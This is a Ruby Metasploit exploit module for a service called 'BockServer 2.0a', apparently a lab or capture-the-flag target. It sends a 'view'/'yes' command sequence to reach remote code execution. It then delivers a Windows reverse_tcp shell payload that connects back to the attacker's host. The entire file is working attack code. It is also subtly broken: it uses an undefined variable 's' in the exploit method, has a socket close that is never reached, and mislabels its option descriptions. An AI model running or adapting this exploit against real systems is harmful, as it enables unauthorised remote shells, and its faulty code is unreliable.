require 'socket'
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
    include Msf::Exploit::Remote::Tcp
    def initialize
        super(
            'Name'           => 'BockServer 2.0a Exploiter',
            'Description'    => 'This module can exploit BockServer 2.0a, creating a meterpreter shell.',
            'DefaultOptions' => { 'RPORT' => 3285, 'PAYLOAD' => 'windows/shell/reverse_tcp' },
	    'Payload' => {'space'=>1024}
            )

        register_options(
            [
              OptString.new('RHOST', [ true, 'Set a remote host' ]),
	      OptString.new('RPORT', [ true, 'Set a remote port' ]),
	      OptString.new('LHOST', [ true, 'Set a remote port' ]),
	      OptString.new('LPORT', [ true, 'Set a remote port' ]),
	      OptString.new('PAYLOAD', [ true, 'Set a payload' ])
            ], self.class)
    end

    def check
	rhost = datastore['RHOST']
	rport = datastore['RPORT']
	if rhost == nil or rport == nil
            print_error("rhost or rport is not properly configured")
            return
        end
        s = TCPSocket.open(rhost, rport)
	begin
            line = s.gets
	rescue Exception => e
	    s.close()
	    return Exploit::CheckCode::Safe
	end
        if line =~ /BockServe 2.0a/
	    s.send("view",0)
	    2.times{s.gets}
	    
	    s.send("yes",0)
	    2.times{s.gets}
	    s.send("print \"hi\"",0)
	    line = s.gets
	    puts line
	    if line =~ /(python -c)|(hi)/
    	        return Exploit::CheckCode::Vulnerable
	    else
		return Exploit::CheckCode::Safe
	    end
        else 
            return Exploit::CheckCode::Safe
        end
	s.close()	
    end
    def exploit()
        buf = payload.encoded
	begin
	    connect
	    line = sock.get_once
	    sock.put("view")
	    2.times{sock.get_once}
	    
	    sock.send("yes")
	    2.times{s.get_once}
	    sock.put(buf)
	rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
		print_status("A problem occured with the socket, exploit failed")
	ensure
		disconnect
	end
    end
end

